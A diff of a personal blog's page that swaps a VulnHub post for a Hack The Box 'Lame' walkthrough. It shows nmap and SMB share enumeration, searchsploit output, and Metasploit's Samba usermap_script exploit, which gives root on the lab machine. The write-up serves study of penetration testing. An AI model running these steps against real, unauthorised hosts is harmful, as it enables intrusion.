@@ -7,44 +7,42 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.70.0 with theme Tranquilpeak 0.4.7-BETA">
 <meta name="author" content="Tiago Tavares">
-<meta name="keywords" content="vulnhub">
-<meta name="description" content="&ldquo;Lampião 1&rdquo; - &ldquo;It&rsquo;s Easy, fi duma égua!&quot;.">
+<meta name="keywords" content="hackthebox">
+<meta name="description" content="Lame - Hack The Box retired machine walkthrough.">
 
 
-<meta property="og:description" content="&ldquo;Lampião 1&rdquo; - &ldquo;It&rsquo;s Easy, fi duma égua!&quot;.">
+<meta property="og:description" content="Lame - Hack The Box retired machine walkthrough.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Lampião 1">
-<meta name="twitter:title" content="Lampião 1">
-<meta property="og:url" content="https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
-<meta property="twitter:url" content="https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+<meta property="og:title" content="Lame - Hack The Box (Retired)">
+<meta name="twitter:title" content="Lame - Hack The Box (Retired)">
+<meta property="og:url" content="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
+<meta property="twitter:url" content="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
 <meta property="og:site_name" content="debugging the life">
-<meta property="og:description" content="&ldquo;Lampião 1&rdquo; - &ldquo;It&rsquo;s Easy, fi duma égua!&quot;.">
-<meta name="twitter:description" content="&ldquo;Lampião 1&rdquo; - &ldquo;It&rsquo;s Easy, fi duma égua!&quot;.">
+<meta property="og:description" content="Lame - Hack The Box retired machine walkthrough.">
+<meta name="twitter:description" content="Lame - Hack The Box retired machine walkthrough.">
 <meta property="og:locale" content="en-us">
 
   
-    <meta property="article:published_time" content="2018-07-28T00:00:00">
+    <meta property="article:published_time" content="2020-05-14T16:31:51">
   
   
-    <meta property="article:modified_time" content="2018-07-28T00:00:00">
+    <meta property="article:modified_time" content="2020-05-14T16:31:51">
   
   
   
     
-      <meta property="article:section" content="🔨Projects">
+      <meta property="article:section" content="📜Walkthroughs">
     
-      <meta property="article:section" content="🐞Vulnerable Machines">
+      <meta property="article:section" content="👨‍💻HackTheBox">
     
   
   
+    
+      <meta property="article:tag" content="hackthebox">
+    
+      <meta property="article:tag" content="haking">
     
       <meta property="article:tag" content="ctf">
-    
-      <meta property="article:tag" content="hacking">
-    
-      <meta property="article:tag" content="lampiao">
-    
-      <meta property="article:tag" content="vulnhub">
     
   
 
@@ -61,18 +59,10 @@
 
 
 
-  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589391618/blog/f6f626904dcb2f342469f7c9190209a1_kvsx9c.jpg">
-  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589391618/blog/f6f626904dcb2f342469f7c9190209a1_kvsx9c.jpg">
+  <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589483960/blog/fb2d9f98400e3c802a0d7145e125c4ff_fytbfk.png">
+  <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589483960/blog/fb2d9f98400e3c802a0d7145e125c4ff_fytbfk.png">
 
 
-
-  
-    <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_67I6yYL25E71p_5SR_Jx8A_bw3t3t.png">
-    <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_67I6yYL25E71p_5SR_Jx8A_bw3t3t.png">
-  
-    <meta property="og:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_e-EgnSyIHD2YBawvXqnKyQ_y0qgmp.png">
-    <meta property="twitter:image" content="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_e-EgnSyIHD2YBawvXqnKyQ_y0qgmp.png">
-  
 
 
 
@@ -80,14 +70,14 @@
   <meta property="twitter:image" content="https://www.gravatar.com/avatar/e68e9fb3fa89ea576f47c7ef05d17448?s=640">
 
 
-    <title>Lampião 1</title>
+    <title>Lame - Hack The Box (Retired)</title>
 
     <link rel="icon" href="images/favicon-32x32.png">
     
 
     
 
-    <link rel="canonical" href="https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+    <link rel="canonical" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -250,15 +240,15 @@ if (!doNotTrack) {
             <div class="post-header main-content-wrap text-left">
   
     <h1 class="post-title" itemprop="headline">
-      Lampião 1
+      Lame - Hack The Box (Retired)
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2018-07-28T00:00:00Z">
+      <time itemprop="datePublished" datetime="2020-05-14T16:31:51-03:00">
         
-  July 28, 2018
+  May 14, 2020
 
       </time>
     
@@ -267,9 +257,9 @@ if (!doNotTrack) {
   
     <span>in</span>
     
-      <a class="category-link" href="https://tiagotavares.io/categories/projects">🔨Projects</a>, 
+      <a class="category-link" href="https://tiagotavares.io/categories/walkthroughs">📜Walkthroughs</a>, 
     
-      <a class="category-link" href="https://tiagotavares.io/categories/vulnerable-machines">🐞Vulnerable Machines</a>
+      <a class="category-link" href="https://tiagotavares.io/categories/hackthebox">👨‍💻HackTheBox</a>
     
   
 
@@ -279,67 +269,143 @@ if (!doNotTrack) {
           
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
-              <p><strong>&ldquo;Lampião 1&rdquo;</strong> - &ldquo;It&rsquo;s Easy, fi duma égua!&quot;.</p>
-<h2 id="description">Description</h2>
-<p>Would you like to keep hacking in your own lab?
-Try this brand new vulnerable machine! <strong>&ldquo;Lampião 1&rdquo;</strong>.
-Get root!</p>
-<p>Level: Easy</p>
-<p>Objective: Get root shell!</p>
-<h1 id="jarbaszip">Jarbas.zip</h1>
-<ul>
-<li><strong>Download:</strong> <a href="http://bit.ly/Lampiao1">http://bit.ly/Lampiao1</a></li>
-<li><strong>Download (Mirror Vulnhub):</strong> <a href="https://download.vulnhub.com/lampiao/Lampiao.zip">https://download.vulnhub.com/lampiao/Lampiao.zip</a></li>
-</ul>
-<h2 id="file-information">File Information</h2>
-<ul>
-<li><strong>Filename:</strong> Lampiao.zip</li>
-<li><strong>File size:</strong> 669 MB</li>
-<li><strong>MD5:</strong> 7437D6FB83B63A7E14BB00F9C7A758B9</li>
-<li><strong>SHA1:</strong> B5CDBF07E78557C19555E26715B99E0DCF2400D5</li>
-</ul>
-<h2 id="virtual-machine">Virtual Machine</h2>
-<ul>
-<li><strong>Format:</strong> Virtual Machine (Virtualbox - OVA)</li>
-<li><strong>Operating System:</strong> Linux</li>
-</ul>
-<h2 id="networking">Networking</h2>
-<ul>
-<li><strong>DHCP service:</strong> Enabled</li>
-<li><strong>IP address:</strong> Automatically assign</li>
-</ul>
-              
-  
-  
-  
-    <div class="image-gallery">
-      <div class="image-gallery-metabar">
-        <span>Gallery 2 images</span>
-      </div>
-      <div class="image-gallery-photos ">
-        
-          
-          
-          <div class="photo-box">
-            <a class="photo-box-inner fancybox" data-fancybox-group="gallery-28424784cb398aa04f6778094df09536"
-               title="" href="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_67I6yYL25E71p_5SR_Jx8A_bw3t3t.png">
-              <img class="photo" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_67I6yYL25E71p_5SR_Jx8A_bw3t3t.png" itemprop="image">
-            </a>
-          </div>
-        
-          
-          
-          <div class="photo-box">
-            <a class="photo-box-inner fancybox" data-fancybox-group="gallery-28424784cb398aa04f6778094df09536"
-               title="" href="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_e-EgnSyIHD2YBawvXqnKyQ_y0qgmp.png">
-              <img class="photo" src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589393207/blog/1_e-EgnSyIHD2YBawvXqnKyQ_y0qgmp.png" itemprop="image">
-            </a>
-          </div>
-        
-      </div>
-    </div>
-    
+              <p>Lame - Hack The Box retired machine walkthrough.</p>
+<h2 id="-enumeration">🔎 Enumeration</h2>
+<pre><code>   root@kali:~# nmap -sV -A -O 10.10.10.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 16:20 -03
+Nmap scan report for 10.10.10.3
+Host is up (0.15s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT:                                                                                                                                                                                                                                  
+| FTP server status:                                                                                                                                                                                                                       
+|      Connected to 10.10.14.34                                                                                                                                                
+|      Logged in as ftp                                                                                                                                                        
+|      TYPE: ASCII                                                                                                                                                             
+|      No session bandwidth limit                                                                                                                                              
+|      Session timeout in seconds is 300                                                                                                                                       
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
+Host script results:
+|_clock-skew: mean: 2h05m59s, deviation: 2h49m46s, median: 5m56s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-05-14T15:26:52-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 21/tcp)
+HOP RTT       ADDRESS
+1   153.27 ms 10.10.14.1
+2   153.37 ms 10.10.10.3
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.37 seconds
+</code></pre>
+<p>nmap &ndash;script smb-enum-shares.nse -p445 10.10.10.3
+Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-05-14 18:17 -03</p>
+<pre><code>    Nmap scan report for 10.10.10.3
+    Host is up (0.15s latency).
+    
+    PORT    STATE SERVICE
+    445/tcp open  microsoft-ds
+    
+    Host script results:
+    | smb-enum-shares: 
+    |   account_used: &lt;blank&gt;
+|   \\10.10.10.3\ADMIN$: 
+|     Type: STYPE_IPC
+|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: &lt;none&gt;
+|   \\10.10.10.3\IPC$: 
+|     Type: STYPE_IPC
+|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|   \\10.10.10.3\opt: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: &lt;none&gt;
+|   \\10.10.10.3\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|   \\10.10.10.3\tmp: 
+|     Type: STYPE_DISKTREE
+|     Comment: oh noes!
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|_    Anonymous access: READ/WRITE
+
+Nmap done: 1 IP address (1 host up) scanned in 67.23 seconds
+</code></pre>
+<h2 id="-foothold">🚪🚶 Foothold</h2>
+<p>For some reason, I couldn&rsquo;t exploit <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523">vsftpd 2.3.4</a>, which is  vulnerable.</p>
+<p>Let&rsquo;s try smb service.</p>
+<pre><code>root@kali:~# searchsploit samba 3.0.20
+---------------------------------------------------------- ---------------------------------
+ Exploit Title                                            |  Path
+---------------------------------------------------------- ---------------------------------
+Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass    | multiple/remote/10095.txt
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rb
+Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
+Samba &lt; 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
+Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)             | linux_x86/dos/36741.py
+---------------------------------------------------------- ---------------------------------
+</code></pre>
+<p>Looking further for infos on the internet and reading some docs, I could find the following:
+<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447</a></p>
+<p>Thankfully Metasploit already has a good exploit to explore it:</p>
+<pre><code># msfconsole
+msf5 &gt; use exploit/multi/samba/usermap_script
+msf5 exploit(multi/samba/usermap_script) &gt; set rhost 10.10.10.3
+rhost =&gt; 10.10.10.3
+msf5 exploit(multi/samba/usermap_script) &gt; run
+</code></pre>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589492675/blog/Image_bh1wc8.png" alt="enter image description here"></p>
+<h2 id="-privilege-escalation">🛡️ Privilege Escalation</h2>
+<p>Not needed. Samba service runs as root user.</p>
+<h2 id="-complete">🍻 Complete</h2>
+<p>As usual, you can get your <strong>root flag</strong> at /root/root.txt and user flag at /home/makis, as shown bellow:</p>
+<p><img src="https://res.cloudinary.com/dtr6hzxnx/image/upload/v1589492306/blog/temp_l5rcml.png" alt="enter image description here"></p>
+              
             </div>
           </div>
           <div id="post-footer" class="post-footer main-content-wrap">
@@ -350,13 +416,11 @@ Get root!</p>
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hackthebox/">hackthebox</a>
+
+  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/haking/">haking</a>
+
   <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/ctf/">ctf</a>
-
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/hacking/">hacking</a>
-
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/lampiao/">lampiao</a>
-
-  <a class="tag tag--primary tag--small" href="https://tiagotavares.io/tags/vulnhub/">vulnhub</a>
 
                   </div>
                 
@@ -369,7 +433,7 @@ Get root!</p>
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/" data-tooltip="Lame - Hack The Box (Retired)">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -377,7 +441,7 @@ Get root!</p>
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2018/07/a-minha-estreia-em-maratonas/" data-tooltip="A minha estreia em maratonas 🏅">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2018/07/lampi%C3%A3o-1/" data-tooltip="Lampião 1">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -395,19 +459,19 @@ Get root!</p>
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -455,7 +519,7 @@ Get root!</p>
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2020/05/lame-hack-the-box-retired/" data-tooltip="Lame - Hack The Box (Retired)">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -463,7 +527,7 @@ Get root!</p>
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2018/07/a-minha-estreia-em-maratonas/" data-tooltip="A minha estreia em maratonas 🏅">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://tiagotavares.io/2018/07/lampi%C3%A3o-1/" data-tooltip="Lampião 1">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -481,19 +545,19 @@ Get root!</p>
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2018/07/lampi%C3%A3o-1/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://tiagotavares.io/2020/05/lame-hack-the-box-retired/">
               <i class="fa fa-google-plus"></i>
             </a>
           </li>
@@ -523,19 +587,19 @@ Get root!</p>
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2018%2F07%2Flampi%25C3%25A3o-1%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
           <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2018%2F07%2Flampi%25C3%25A3o-1%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
           <i class="fa fa-twitter"></i><span>Share on Twitter</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2018%2F07%2Flampi%25C3%25A3o-1%2F">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Ftiagotavares.io%2F2020%2F05%2Flame-hack-the-box-retired%2F">
           <i class="fa fa-google-plus"></i><span>Share on Google&#43;</span>
         </a>
       </li>
@@ -625,9 +689,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/tiagotavares.io\/2018\/07\/lampi%C3%A3o-1\/';
+          this.page.url = 'https:\/\/tiagotavares.io\/2020\/05\/lame-hack-the-box-retired\/';
           
-            this.page.identifier = '\/2018\/07\/lampi%C3%A3o-1\/'
+            this.page.identifier = '\/2020\/05\/lame-hack-the-box-retired\/'
           
         };
         (function() {
